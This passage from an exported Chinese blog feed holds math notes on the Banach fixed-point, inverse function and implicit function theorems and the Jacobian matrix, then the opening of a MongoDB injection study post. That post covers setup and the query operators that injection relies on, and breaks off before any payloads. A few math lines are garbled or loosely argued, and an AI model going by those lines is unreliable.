<h4 id="4-证明-x-是不动点："><a href="#4-证明-x-是不动点：" class="headerlink" title="4. 证明 $x^*$ 是不动点："></a>4. 证明 $x^*$ 是不动点：</h4><p>由于 $T$ 是连续的（压缩映射是连续的），有：<br>$$<br>T(x^*) = T\left(\lim_{n \to \infty} x_n\right) = \lim_{n \to \infty} T(x_n) = \lim_{n \to \infty} x_{n+1} = x^*.<br>$$<br>因此，$x^*$ 是 $T$ 的不动点。</p>
<h4 id="5-唯一性："><a href="#5-唯一性：" class="headerlink" title="5. 唯一性："></a>5. 唯一性：</h4><p>假设存在另一个不动点 $y^*$，即 $T(y^*) = y^*$，则：<br>$$<br>d(x^*, y^*) = d(T(x^*), T(y^*)) \leq k \cdot d(x^*, y^*).<br>$$<br>由于 $0 \leq k &lt; 1$，只有当 $d(x^*, y^*) = 0$ 时成立，即 $x^* = y^*$。因此，不动点唯一。</p>
<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li><strong>Banach 不动点定理</strong>表明，在完备度量空间中，压缩映射存在唯一的不动点。</li>
<li>证明的关键是通过构造序列并利用压缩映射的性质证明序列收敛，然后验证极限点是不动点。</li>
<li>该定理在数值分析、微分方程和优化等领域有广泛应用。</li>
</ul>
<hr>
<h1 id="逆函数定理的证明"><a href="#逆函数定理的证明" class="headerlink" title="逆函数定理的证明"></a>逆函数定理的证明</h1><h3 id="定理内容"><a href="#定理内容" class="headerlink" title="定理内容"></a>定理内容</h3><p>给定一个连续可微函数 $f: \mathbb{R}^n \to \mathbb{R}^n$，若在某一点 $x_0 \in \mathbb{R}^n$，该函数的雅可比矩阵 $J_f(x_0)$ 是满秩的（即 $\det(J_f(x_0)) \neq 0$，雅可比矩阵可逆），那么可以得出以下结论：</p>
<ol>
<li><strong>局部可逆性</strong>：<br>在点 $x_0$ 的某个小邻域内，$f$ 是双射（即每个点都有唯一的像，并且每个像值对应唯一的原点），即 $f$ 在该邻域内有逆函数 $f^{-1}$。</li>
<li><strong>逆函数的性质</strong>：<br>逆函数 $f^{-1}$ 也是连续可微的（$C^1$），并且其导数由雅可比矩阵的逆给出：<br>$$<br>J_{f^{-1}}(f(x)) = [J_f(x)]^{-1},<br>$$<br>对于 $x$ 在邻域内。</li>
</ol>
<p>总结来说，如果 $J_f(x_0)$ 是可逆的，则 $f$ 在 $x_0$ 的邻域内具有光滑的逆函数。</p>
<p>注：</p>
<ul>
<li><p>其实当时学到这里是有一个疑问，不知道为什么需要前面预备知识的铺垫。因为雅可比矩阵可逆，不就已经说明了是有逆函数的，还需要证明吗？</p>
</li>
<li><p>但雅可比矩阵是泰勒公式的一阶展开，“一阶可逆”只能保证在无穷小邻域接近可逆，但是逆函数定理说的局部，并不是指无穷小（infinitesimal）邻域；而是“存在某个非零半径的开邻域”，通常记为 $U$。在这个$U$里，$f$关于 $x0$ 是双射（即一一对应），并且逆函数还是光滑/连续可微的。</p>
</li>
<li><p>换句话说这里是在高阶项的扰动不会”压倒”线性项：在足够小但是非无穷小邻域接近可逆的范围内，线性项占主导。（线性部分 + 小扰动 = 整体可逆）</p>
</li>
</ul>
<hr>
<h3 id="直观思路"><a href="#直观思路" class="headerlink" title="直观思路"></a>直观思路</h3><p>逆函数 $f^{-1}$ 的基本定义是：给定 $y \in \mathbb{R}^n$，我们需要找到唯一的 $x \in \mathbb{R}^n$，使得 $f(x) = y$。<br>若 $f$ 在某点 $x_0$ 处是可逆的（即雅可比矩阵 $J_f(x_0)$ 可逆），可以通过近似线性化的方法（泰勒展开），证明每一个 $y$ 都有一个唯一解 $x$ 使 $f(x) = y$，而这个解可以通过压缩映射定理来找到。</p>
<hr>
<h3 id="详细证明"><a href="#详细证明" class="headerlink" title="详细证明"></a>详细证明</h3><h4 id="（1）定义辅助映射："><a href="#（1）定义辅助映射：" class="headerlink" title="（1）定义辅助映射："></a>（1）定义辅助映射：</h4><p>设 $y \in \mathbb{R}^n$ 是任意的目标值，并且我们希望找到 $x \in \mathbb{R}^n$，使得 $f(x) = y$。令：<br>$$<br>T(x) = x - J_f(x_0)^{-1} \cdot (f(x) - y),<br>$$<br>其中 $J_f(x_0)$ 是 $f$ 在点 $x_0$ 的雅可比矩阵。</p>
<p>需要证明：  </p>
<ol>
<li>映射 $T(x)$ 是一个压缩映射；  </li>
<li>压缩映射 $T(x)$ 的不动点 $x^*$ 满足 $f(x^*) = y$。</li>
</ol>
<hr>
<h4 id="（2）泰勒展开（局部线性化）："><a href="#（2）泰勒展开（局部线性化）：" class="headerlink" title="（2）泰勒展开（局部线性化）："></a>（2）泰勒展开（局部线性化）：</h4><p>由 $f(x)$ 在点 $x_0$ 的泰勒展开（在一阶导数处截断）：<br>$$<br>f(x) \approx f(x_0) + J_f(x_0) \cdot (x - x_0).<br>$$<br>令 $\Delta x = x - x_0$，有：<br>$$<br>f(x) \approx f(x_0) + J_f(x_0) \cdot \Delta x.<br>$$<br>设 $y = f(x)$，可以通过线性化近似得到：<br>$$<br>x \approx x_0 + J_f(x_0)^{-1} \cdot (y - f(x_0)).<br>$$<br>这表明，对于充分小的扰动 $y - f(x_0)$，可以从初始点 $x_0$ 通过迭代来逐步接近解。</p>
<p>注：已知$y$找到对应$x$，通过迭代来求解。这里核心是要正明迭代可以收敛，于是下面构造压缩映射。</p>
<hr>
<h4 id="（3）设计压缩映射："><a href="#（3）设计压缩映射：" class="headerlink" title="（3）设计压缩映射："></a>（3）设计压缩映射：</h4><p>选定 $x_0$ 邻域内的点 $x$ 和目标值 $y$，定义迭代映射：<br>$$<br>T(x) = x - J_f(x_0)^{-1} \cdot (f(x) - y).<br>$$<br>我们需要证明 $T(x)$ 是压缩映射。注意到：<br>$$<br>T(x) - T(z) = x - z - J_f(x_0)^{-1} \cdot (f(x) - f(z)).<br>$$<br>利用 $f(x)$ 的连续可微性，有：<br>$$<br>f(x) - f(z) = J_f( c ) \cdot (x - z),<br>$$<br>注：拉格朗日中值定理，$c$是拉格朗日中值。<br>其中 $J_f(c)$ 是某个点 $c \in \mathbb{R}^n$ 的雅可比矩阵。代入得到：<br>$$<br>T(x) - T(z) = (I - J_f(x_0)^{-1} \cdot J_f( c )) \cdot (x - z).<br>$$<br>若 $J_f(x_0)$ 足够接近于 $J_f( c )$（在 $x_0$ 的邻域内），矩阵 $I - J_f(x_0)^{-1} J_f( c )$ 的范数小于 1，因此 $T$ 是压缩映射。</p>
<hr>
<h4 id="（4）应用压缩映射定理："><a href="#（4）应用压缩映射定理：" class="headerlink" title="（4）应用压缩映射定理："></a>（4）应用压缩映射定理：</h4><p>根据压缩映射定理，$T(x)$ 有唯一的不动点 $x^*$。对于该不动点，有：<br>$$<br>T(x^*) = x^* \implies x^* - J_f(x_0)^{-1} \cdot (f(x^*) - y) = x^*,<br>$$<br>化简得到：<br>$$<br>f(x^*) = y.<br>$$<br>因此，$x^*$ 是方程 $f(x) = y$ 的唯一解。</p>
<hr>
<h4 id="（5）局部可逆性与光滑性："><a href="#（5）局部可逆性与光滑性：" class="headerlink" title="（5）局部可逆性与光滑性："></a>（5）局部可逆性与光滑性：</h4><p>上述过程说明 $f$ 在 $x_0$ 的某邻域是局部可逆的，并且 $f^{-1}$ 是由连续迭代构造的，因此它是光滑（$C^1$）的。</p>
]]></content>
      <tags>
        <tag>ML</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>ML的数学基石-隐函数定理（Implicit function theorem）</title>
    <url>/2025/05/25/ML%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%9F%B3-%E9%9A%90%E5%87%BD%E6%95%B0%E5%AE%9A%E7%90%86%EF%BC%88implicit-function-theorem%EF%BC%89/</url>
    <content><![CDATA[<p>注：<strong>请多刷新一次前端，以便让数学公式正确渲染。</strong></p>
<p>通过之前博文学习的反函数定理，雅可比矩阵等推到出隐函数定理。</p>
<h2 id="隐函数定理的陈述"><a href="#隐函数定理的陈述" class="headerlink" title="隐函数定理的陈述"></a>隐函数定理的陈述</h2><p>首先，让我们明确隐函数定理要说什么：</p>
<p><strong>隐函数定理</strong>：设 $ F: \mathbb{R}^{n+m} \to \mathbb{R}^m $ 是 $ C^1 $ 函数，点 $ (a,b) \in \mathbb{R}^n \times \mathbb{R}^m $ 满足：</p>
<ol>
<li>$ F(a,b) = 0 $</li>
<li>$ \frac{\partial F}{\partial y}(a,b) $ 是可逆的 $ m \times m $ 矩阵</li>
</ol>
<p>则存在 $ a $ 的邻域 $ U $ 和 $ b $ 的邻域 $ V $，以及 $ C^1 $ 函数 $ g: U \to V $，使得：</p>
<ul>
<li>$ g(a) = b $</li>
<li>对所有 $ x \in U $，有 $ F(x, g(x)) = 0 $</li>
</ul>
<h2 id="从反函数定理推导隐函数定理"><a href="#从反函数定理推导隐函数定理" class="headerlink" title="从反函数定理推导隐函数定理"></a>从反函数定理推导隐函数定理</h2><h3 id="步骤-1：构造辅助函数"><a href="#步骤-1：构造辅助函数" class="headerlink" title="步骤 1：构造辅助函数"></a>步骤 1：构造辅助函数</h3><p>定义函数 $ G: \mathbb{R}^{n+m} \to \mathbb{R}^{n+m} $：</p>
<p>$ G(x,y) = (x, F(x,y)) $</p>
<p>其中 $ x \in \mathbb{R}^n $，$ y \in \mathbb{R}^m $。</p>
<h3 id="步骤-2：计算雅可比矩阵"><a href="#步骤-2：计算雅可比矩阵" class="headerlink" title="步骤 2：计算雅可比矩阵"></a>步骤 2：计算雅可比矩阵</h3><p>$ G $ 的雅可比矩阵是：</p>
<p>$ DG(x,y) = \begin{pmatrix}<br>I_n &amp; 0 \\<br>\frac{\partial F}{\partial x} &amp; \frac{\partial F}{\partial y}<br>\end{pmatrix} $</p>
<p>其中 $ I_n $ 是 $ n \times n $ 单位矩阵。</p>
<p>附录里面的给出这一步的详细推导。</p>
<h3 id="步骤-3：验证雅可比矩阵可逆"><a href="#步骤-3：验证雅可比矩阵可逆" class="headerlink" title="步骤 3：验证雅可比矩阵可逆"></a>步骤 3：验证雅可比矩阵可逆</h3><p>在点 $ (a,b) $ 处，由于 $ \frac{\partial F}{\partial y}(a,b) $ 可逆，我们可以计算：</p>
<p>$ \det(DG(a,b)) = \det(I_n) \cdot \det\left(\frac{\partial F}{\partial y}(a,b)\right) \neq 0 $</p>
<p>因此 $ DG(a,b) $ 是可逆的。</p>
<h3 id="步骤-4：应用反函数定理"><a href="#步骤-4：应用反函数定理" class="headerlink" title="步骤 4：应用反函数定理"></a>步骤 4：应用反函数定理</h3><p>由反函数定理，存在 $ (a,b) $ 的邻域 $ W $ 和 $ G(a,b) = (a,0) $ 的邻域 $ W’ $，使得 $ G: W \to W’ $ 有 $ C^1 $ 逆函数 $ G^{-1} $。</p>
<h3 id="步骤-5：构造隐函数"><a href="#步骤-5：构造隐函数" class="headerlink" title="步骤 5：构造隐函数"></a>步骤 5：构造隐函数</h3><p>设 $ G^{-1}(x,z) = (H_1(x,z), H_2(x,z)) $，其中 $ H_1: W’ \to \mathbb{R}^n $，$ H_2: W’ \to \mathbb{R}^m $。</p>
<p>由于 $ G \circ G^{-1} = \text{原来映射出的值}$，我们有：$ G(H_1(x,z), H_2(x,z)) = (x,z) $</p>
<p>展开得：$ (H_1(x,z), F(H_1(x,z), H_2(x,z))) = (x,z) $</p>
<p>这给出：</p>
<ol>
<li>$ H_1(x,z) = x $</li>
<li>$ F(x, H_2(x,z)) = z $</li>
</ol>
<h3 id="步骤-6：定义隐函数"><a href="#步骤-6：定义隐函数" class="headerlink" title="步骤 6：定义隐函数"></a>步骤 6：定义隐函数</h3><p>取 $ z = 0 $，定义 $ g(x) = H_2(x,0) $。</p>
<p>由于 $ G^{-1}(a,0) = (a,b) $，我们有 $ g(a) = H_2(a,0) = b $。</p>
<p>对于 $ x $ 在 $ a $ 的适当邻域内，由步骤5的第二个等式：</p>
<p>$ F(x, g(x)) = F(x, H_2(x,0)) = 0 $</p>
<h2 id="通俗理解整个过程"><a href="#通俗理解整个过程" class="headerlink" title="通俗理解整个过程"></a>通俗理解整个过程</h2><p>如果 $G$ 有反函数 $G^{-1}$，那么：</p>
<ul>
<li>给定 $(x, 0)$，$G^{-1}$ 能告诉我们对应的 $(x, y)$</li>
<li>这个对应中的$y$ 正好满足$F(x, y) = 0$。</li>
</ul>
<h1 id="附录：推导DG-x-y-的左上角为什么是单位矩阵"><a href="#附录：推导DG-x-y-的左上角为什么是单位矩阵" class="headerlink" title="附录：推导DG(x,y)的左上角为什么是单位矩阵"></a>附录：推导DG(x,y)的左上角为什么是单位矩阵</h1><p>我来详细推导为什么雅可比矩阵 $ DG(x,y) $ 的左上角是单位矩阵 $ I_n $。</p>
<h2 id="回顾函数定义"><a href="#回顾函数定义" class="headerlink" title="回顾函数定义"></a>回顾函数定义</h2><p>我们定义了函数 $ G: \mathbb{R}^{n+m} \to \mathbb{R}^{n+m} $：</p>
<p>$ G(x,y) = (x, F(x,y)) $</p>
<p>其中：</p>
<ul>
<li>$ x = (x_1, x_2, …, x_n) \in \mathbb{R}^n $</li>
<li>$ y = (y_1, y_2, …, y_m) \in \mathbb{R}^m $</li>
<li>$ F: \mathbb{R}^{n+m} \to \mathbb{R}^m $</li>
</ul>
<h2 id="分解-G-的分量"><a href="#分解-G-的分量" class="headerlink" title="分解 $ G $ 的分量"></a>分解 $ G $ 的分量</h2><p>我们可以将 $ G $ 写成分量形式：</p>
<p>$ G(x,y) = \begin{pmatrix}<br>g_1(x,y) \\<br>g_2(x,y) \\<br>\vdots \\<br>g_n(x,y) \\<br>g_{n+1}(x,y) \\<br>\vdots \\<br>g_{n+m}(x,y)<br>\end{pmatrix} = \begin{pmatrix}<br>x_1 \\<br>x_2 \\<br>\vdots \\<br>x_n \\<br>F_1(x,y) \\<br>\vdots \\<br>F_m(x,y)<br>\end{pmatrix} $</p>
<h2 id="计算雅可比矩阵的元素"><a href="#计算雅可比矩阵的元素" class="headerlink" title="计算雅可比矩阵的元素"></a>计算雅可比矩阵的元素</h2><p>雅可比矩阵 $ DG(x,y) $ 的第 $ (i,j) $ 元素是 $ \frac{\partial g_i}{\partial x_j} $ 或 $ \frac{\partial g_i}{\partial y_k} $。</p>
<h3 id="对于前-n-行（-i-1-2-…-n-）："><a href="#对于前-n-行（-i-1-2-…-n-）：" class="headerlink" title="对于前 $ n $ 行（$ i = 1, 2, …, n $）："></a>对于前 $ n $ 行（$ i = 1, 2, …, n $）：</h3><p>由于 $ g_i(x,y) = x_i $，我们有：</p>
<ul>
<li>当 $ j \leq n $ 时：$ \frac{\partial g_i}{\partial x_j} = \frac{\partial x_i}{\partial x_j} = \begin{cases} 1 &amp; \text{如果 } i = j \ 0 &amp; \text{如果 } i \neq j \end{cases} $</li>
<li>当 $ j &gt; n $ 时（即对 $ y_k $ 求导）：$ \frac{\partial g_i}{\partial y_k} = \frac{\partial x_i}{\partial y_k} = 0 $</li>
</ul>
<h2 id="构造雅可比矩阵"><a href="#构造雅可比矩阵" class="headerlink" title="构造雅可比矩阵"></a>构造雅可比矩阵</h2><p>因此，雅可比矩阵的形式是：</p>
<p>$ DG(x,y) = \begin{pmatrix}<br>\frac{\partial x_1}{\partial x_1} &amp; \cdots &amp; \frac{\partial x_1}{\partial x_n} &amp; \frac{\partial x_1}{\partial y_1} &amp; \cdots &amp; \frac{\partial x_1}{\partial y_m} \\<br>\vdots &amp; \ddots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\<br>\frac{\partial x_n}{\partial x_1} &amp; \cdots &amp; \frac{\partial x_n}{\partial x_n} &amp; \frac{\partial x_n}{\partial y_1} &amp; \cdots &amp; \frac{\partial x_n}{\partial y_m} \\<br>\frac{\partial F_1}{\partial x_1} &amp; \cdots &amp; \frac{\partial F_1}{\partial x_n} &amp; \frac{\partial F_1}{\partial y_1} &amp; \cdots &amp; \frac{\partial F_1}{\partial y_m} \\<br>\vdots &amp; \ddots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\<br>\frac{\partial F_m}{\partial x_1} &amp; \cdots &amp; \frac{\partial F_m}{\partial x_n} &amp; \frac{\partial F_m}{\partial y_1} &amp; \cdots &amp; \frac{\partial F_m}{\partial y_m}<br>\end{pmatrix} $</p>
<p>代入我们计算的值：</p>
<p>$ DG(x,y) = \begin{pmatrix}<br>1 &amp; 0 &amp; \cdots &amp; 0 &amp; 0 &amp; \cdots &amp; 0 \\<br>0 &amp; 1 &amp; \cdots &amp; 0 &amp; 0 &amp; \cdots &amp; 0 \\<br>\vdots &amp; \vdots &amp; \ddots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\<br>0 &amp; 0 &amp; \cdots &amp; 1 &amp; 0 &amp; \cdots &amp; 0 \\<br>\frac{\partial F_1}{\partial x_1} &amp; \cdots &amp; \frac{\partial F_1}{\partial x_n} &amp; \frac{\partial F_1}{\partial y_1} &amp; \cdots &amp; \frac{\partial F_1}{\partial y_m} \\<br>\vdots &amp; \ddots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\<br>\frac{\partial F_m}{\partial x_1} &amp; \cdots &amp; \frac{\partial F_m}{\partial x_n} &amp; \frac{\partial F_m}{\partial y_1} &amp; \cdots &amp; \frac{\partial F_m}{\partial y_m}<br>\end{pmatrix} $</p>
<p>这就是为什么左上角是 $ n \times n $ 单位矩阵 $ I_n $，右上角是 $ n \times m $ 零矩阵。</p>
]]></content>
      <tags>
        <tag>ML</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>ML的数学基石-雅可比矩阵（Jacobian Matrix)</title>
    <url>/2025/03/04/ML%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%9F%B3-%E9%9B%85%E5%8F%AF%E6%AF%94%E7%9F%A9%E9%98%B5%EF%BC%88Jacobian-Matrix%EF%BC%89/</url>
    <content><![CDATA[<p>注：<strong>请多刷新一次前端，以便让数学公式正确渲染。</strong></p>
<h1 id="定义与基本解释"><a href="#定义与基本解释" class="headerlink" title="定义与基本解释"></a>定义与基本解释</h1><p>雅可比矩阵是描述多元函数在某一点处的局部线性近似（即全导数）的矩阵形式。它是多变量微积分中非常重要的概念，用于研究函数的变化率、方向导数以及映射的局部特性。  </p>
<p>一般定义：<br>设 $ f: \mathbb{R}^n \to \mathbb{R}^m $ 是从 $ \mathbb{R}^n $ 映射到 $ \mathbb{R}^m $ 的一个函数：  </p>
<p>$ f(x_1, x_2, \dots, x_n) = \begin{bmatrix}<br>f_1(x_1, x_2, \dots, x_n) \\<br>f_2(x_1, x_2, \dots, x_n)\\\<br>\vdots \\<br>f_m(x_1, x_2, \dots, x_n)  \\<br>\end{bmatrix}, $</p>
<p>其中 $ f_1, f_2, \dots, f_m $ 是 $ f $ 的分量函数。  </p>
<p>在点 $ X = (x_1, x_2, \dots, x_n) $ 处，函数 $ f $ 的雅可比矩阵  $ J_f(X) $ 是一个 $ m \times n $的矩阵，定义为：  </p>
<p>$ J_f(X) =<br>\begin{bmatrix}<br>\frac{\partial f_1}{\partial x_1} &amp; \frac{\partial f_1}{\partial x_2} &amp; \cdots &amp; \frac{\partial f_1}{\partial x_n} \\<br>\frac{\partial f_2}{\partial x_1} &amp; \frac{\partial f_2}{\partial x_2} &amp; \cdots &amp; \frac{\partial f_2}{\partial x_n} \\<br>\vdots &amp; \vdots &amp; \ddots &amp; \vdots \\<br>\frac{\partial f_m}{\partial x_1} &amp; \frac{\partial f_m}{\partial x_2} &amp; \cdots &amp; \frac{\partial f_m}{\partial x_n}  \\<br>\end{bmatrix}. $</p>
<p>相当于 $ J_f(X) $ 的第 $ (i,j) $ 项是函数 $ f_i $ 对变量 $ x_j $ 的偏导数：  </p>
<p>$ [J_f(X)]_{i,j} = \frac{\partial f_i}{\partial x_j}. $</p>
<hr>
<h1 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h1><ul>
<li>如果 $ f $ 是标量函数（即 $ m = 1 $ ），那么雅可比矩阵是一个  $ 1 \times n $ 的行向量，称为函数 $ f $的 梯度向量 。  </li>
<li>如果 $ f $ 是从 $ \mathbb{R}^n \to \mathbb{R}^n $ 的向量函数（即 $ n = m $ ），则雅可比矩阵是一个方阵，常被用于研究  $ f $在点处的可逆性等性质。</li>
</ul>
<hr>
<h1 id="几何意义"><a href="#几何意义" class="headerlink" title="几何意义"></a>几何意义</h1><ol>
<li><strong>局部变化率与线性近似</strong>：雅可比矩阵定义了 $ f $ 在某一点的<strong>线性近似</strong> 。从泰勒展开的角度来看，如果 $ \Delta $ 是自变量的小增量，那么：   $ f(X + \Delta X) \approx f(X) + J_f(X) \cdot \Delta X. $  其中 $ J_f(X) \cdot \Delta   $ 表示由雅可比矩阵定义的线性部分。 </li>
<li><strong>方向导数</strong>：如果方向单位向量为 $ v \in \mathbb{R} $，那么 $ J_f(X) $ 是函数$ f $沿着方向 $ v $的变化率。 </li>
<li><strong>几何映射的局部行为</strong>：雅可比矩阵描述了映射 $f$ 在一点处的<strong>局部伸缩、旋转或反射</strong> 的性质： <ol>
<li>如果 $ n = $ 且雅可比行列式（即 $ \det(J_f(X) $）不为 0，则 $ f $ 在这一点处是局部的双射。 </li>
<li>如果雅可比行列式为 0，则 $ f $ 在这一点可能是奇异的（不可逆）。</li>
</ol>
</li>
</ol>
<hr>
<h1 id="计算实例"><a href="#计算实例" class="headerlink" title="计算实例"></a>计算实例</h1><h2 id="示例-1：标量情况"><a href="#示例-1：标量情况" class="headerlink" title="示例 1：标量情况"></a>示例 1：标量情况</h2><p>函数 $ f(x,y) = x^2 + y^2 $，其雅可比矩阵是：  </p>
<p>$ J_f(x,y) = \begin{bmatrix}<br>\frac{\partial f}{\partial x} &amp; \frac{\partial f}{\partial y}<br>\end{bmatrix}<br>= \begin{bmatrix}<br>2x &amp; 2y<br>\end{bmatrix}. $</p>
<h2 id="示例-2：向量情况"><a href="#示例-2：向量情况" class="headerlink" title="示例 2：向量情况"></a>示例 2：向量情况</h2><p>定义 $ f(x,y,z) = \begin{bmatrix} x^2y \\ yz \\ e^x+z \end{bmatrix} $，则雅可比矩阵为：  </p>
<p>$ J_f(x,y,z) =<br>\begin{bmatrix}<br>\frac{\partial f_1}{\partial x} &amp; \frac{\partial f_1}{\partial y} &amp; \frac{\partial f_1}{\partial z} \\<br>\frac{\partial f_2}{\partial x} &amp; \frac{\partial f_2}{\partial y} &amp; \frac{\partial f_2}{\partial z} \\<br>\frac{\partial f_3}{\partial x} &amp; \frac{\partial f_3}{\partial y} &amp; \frac{\partial f_3}{\partial z}<br>\end{bmatrix}  =  \begin{bmatrix}<br>2xy &amp; x^2 &amp; 0 \\<br>0 &amp; z &amp; y \\<br>e^x &amp; 0 &amp; 1  \\<br>\end{bmatrix}. $</p>
]]></content>
      <tags>
        <tag>ML</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>MONGODB注入学习</title>
    <url>/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<!-- With MongoDB we are not building queries from strings, so traditional SQL injection attacks are not a problem. -MongoDB Developer FAQ -->
<!-- more -->
<h2 id="写在前面">写在前面</h2>
<p>主要是对网上paper的一些总结以及最近遇到场景的一些总结。</p>
<p><strong>千万不要用php7搭环境！千万不要用php7搭环境！千万不要用php7搭环境！</strong></p>
<p>对比一下代码量可以发现php7的mongodb扩展实在是太恶心了。所以不嫌麻烦的话建议用ubuntu14。</p>
<p>php5</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">new</span> <span class="title class_">MongoClient</span>())-&gt;&#123;<span class="variable">$db</span>&#125;-&gt;&#123;<span class="variable">$collection</span>&#125;-&gt;<span class="title function_ invoke__">findOne</span>([<span class="string">&#x27;_id&#x27;</span> =&gt; <span class="variable">$id</span>]);</span><br></pre></td></tr></table></figure>
<p>php7</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$mongo</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>();</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$mongo</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;db.collection&#x27;</span>, <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>([<span class="string">&#x27;_id&#x27;</span>=&gt;<span class="variable">$id</span>], []), <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">ReadPreference</span>(MongoDB<span class="title class_">\Driver\ReadPreference</span>::<span class="variable constant_">RP_PRIMARY_PREFERRED</span>));</span><br><span class="line"><span class="comment">// 返回的$result是一个对象，需要手动转换成数组。</span></span><br></pre></td></tr></table></figure>
<h2 id="环境搭建">环境搭建</h2>
<p>lamp环境</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get apache2</span><br><span class="line"><span class="built_in">sudo</span> apt-get install php5 php-pear php5-dev</span><br><span class="line"><span class="built_in">sudo</span> apt-get install libsasl2-dev</span><br></pre></td></tr></table></figure>
<p>安装php mongdb扩展</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pecl install mongodb</span><br></pre></td></tr></table></figure>
<p>额外安装mongodb server，注意不要用apt-get自带的安装，那个版本貌似比较低，用不了简洁的php写法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-ubuntu1404-3.4.9.tgz</span><br><span class="line">tar -zxvf </span><br><span class="line">mongodb-linux-x86_64-ubuntu1404-3.4.9.tgz</span><br><span class="line"><span class="built_in">cd</span> mongodb-linux-x86_64-ubuntu1404-3.4.9/bin</span><br><span class="line"><span class="built_in">sudo</span> apt-get install mongodb-server</span><br></pre></td></tr></table></figure>
<p>将<code>extension=mongodb.so</code>放入的php.ini中，因为装的apache故修改<code>/etc/php/7.0/apache2</code></p>
<p><img src="phpinfo.png" alt="phpinfo.png"></p>
<p>另外mongodb还有一个28017端口是mongodb的web管理接口</p>
<p><img src="%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3.jpg" alt="默认端口.jpg"></p>
<p><img src="%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A32.png" alt="默认端口2.png"></p>
<p><img src="web.jpg" alt="web.jpg"></p>
<h2 id="基本简单操作">基本简单操作</h2>
<ul>
<li>切换或创建数据库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use runoob</span><br></pre></td></tr></table></figure>
<ul>
<li>删除数据库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.dropDatabase()</span><br></pre></td></tr></table></figure>
<ul>
<li>创建集合</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.site.insert(&quot;goole&quot;:&quot;www.google.com&quot;)</span><br></pre></td></tr></table></figure>
<ul>
<li>删除集合</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.site.drop()</span><br></pre></td></tr></table></figure>
<ul>
<li>插入文档</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.users.insert(&#123;</span><br><span class="line">	username:&quot;cl0und&quot;,</span><br><span class="line">	password:&quot;cl0und1pass&quot;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<ul>
<li>更新文档<br>
update法</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.site.update(&#123;&#x27;title&#x27;:&#x27;MongoDB 教程&#x27;&#125;,&#123;$set:&#123;&#x27;title&#x27;:&#x27;MongoDB&#x27;&#125;&#125;)</span><br></pre></td></tr></table></figure>
<p>save法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.collection.save(</span><br><span class="line">   &lt;document&gt;,</span><br><span class="line">   &#123;</span><br><span class="line">     writeConcern: &lt;document&gt;</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>删除文档</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.collection.remove(</span><br><span class="line">   &lt;query&gt;,</span><br><span class="line">   &#123;</span><br><span class="line">     justOne: &lt;boolean&gt;,</span><br><span class="line">     writeConcern: &lt;document&gt;</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h2 id="主要说说查找">主要说说查找</h2>
<p>在我所见的paper中基本上都是讲通过查找注入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.user.find(&#123;&#x27;id&#x27;:&#123;$gt:1&#125;&#125;) #从当前数据库的集合user中查找id大于1文档</span><br></pre></td></tr></table></figure>
<p>可以发现查询的时候常常会用一些逻辑操作符，而一部分注入姿势就是由此而来的（下面会说到）</p>
<ul>
<li>gt 大于 {“field”: {$gt: value}}</li>
<li>lt 小于 {“field”: {$lt: value}}</li>
<li>gte 大于等于 {“field”: {$gte: value}}</li>
<li>lte 小于等于 {“field”: {$lte: value}}</li>
<li>ne 不等于 {“member.age”: {$ne: “mine”}}</li>
<li>exists 存在与否 {“member”: {$exists: true}}}</li>
<li>in 包含 {“member.age”: {$in: [null], “$exists: true”}}</li>
<li>exists 存在与否 {“couponsCode.0”: {$exists: 1}} #数组存在第一条数据</li>
<li>or 或者 {“$or”: [{“member.age”: “23”}, {“<a href="http://member.name">member.name</a>”: “23333”}]}</li>
<li>and 并且 {“$and”: [{“member.age”: “23”}, {“<a href="http://member.name">member.name</a>”: “23333”}]}</li>
<li>regex 正则 ({“name”:{“$regex”:‘^a$’}})</li>
<li>size 个数 ({“name”:{“$size”:3}})	# $size  name元素数为3</li>
</ul>
<h2 id="注入姿势">注入姿势</h2>
